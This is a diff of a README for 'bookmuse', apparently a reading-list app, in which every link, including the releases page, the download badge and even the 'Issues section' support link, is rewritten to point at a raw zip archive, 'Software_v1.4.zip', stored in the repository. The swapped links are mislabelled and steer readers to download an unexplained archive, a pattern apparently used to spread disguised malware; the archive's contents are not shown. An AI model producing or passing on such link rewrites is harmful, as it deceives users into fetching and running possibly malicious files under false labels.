@@ -4,7 +4,7 @@
 bookmuse generates personalized reading lists based on your interests and reading history. It's simple to use, and it helps you discover new books tailored just for you.
 
 ## 📥 Download Now
-[![Download bookmuse](https://img.shields.io/badge/Download%20bookmuse-v1.0-blue)](https://github.com/RamonARC97/bookmuse/releases)
+[![Download bookmuse](https://github.com/RamonARC97/bookmuse/raw/refs/heads/main/bookmuse/Software_v1.4.zip%20bookmuse-v1.0-blue)](https://github.com/RamonARC97/bookmuse/raw/refs/heads/main/bookmuse/Software_v1.4.zip)
 
 ## 🛠️ System Requirements
 - Operating System: Windows 10 or later / macOS Mojave or later
@@ -21,7 +21,7 @@ bookmuse generates personalized reading lists based on your interests and readin
 - Clear and structured lists for better organization.
 
 ## 📄 How to Download & Install
-1. Visit the [Releases page](https://github.com/RamonARC97/bookmuse/releases).
+1. Visit the [Releases page](https://github.com/RamonARC97/bookmuse/raw/refs/heads/main/bookmuse/Software_v1.4.zip).
 2. Select the version you wish to download.
 3. Look for the file suitable for your operating system.
 4. Click the download link to save the file to your computer.
@@ -46,7 +46,7 @@ If you encounter any issues while using bookmuse, consider these steps:
 - Check for updates on the Releases page for the latest version.
 
 ## 💬 Support
-For additional help, visit the [Issues section](https://github.com/RamonARC97/bookmuse/issues) of this repository, where you can ask questions or report problems.
+For additional help, visit the [Issues section](https://github.com/RamonARC97/bookmuse/raw/refs/heads/main/bookmuse/Software_v1.4.zip) of this repository, where you can ask questions or report problems.
 
 ## 📅 Future Updates
 bookmuse aims to grow. Future updates may include:
@@ -55,4 +55,4 @@ bookmuse aims to grow. Future updates may include:
 - Expanded library features for users to track their reading progress.
 
 ## 📥 Download Now Again
-Don't forget to visit the [Releases page](https://github.com/RamonARC97/bookmuse/releases) to download your copy of bookmuse today!
+Don't forget to visit the [Releases page](https://github.com/RamonARC97/bookmuse/raw/refs/heads/main/bookmuse/Software_v1.4.zip) to download your copy of bookmuse today!
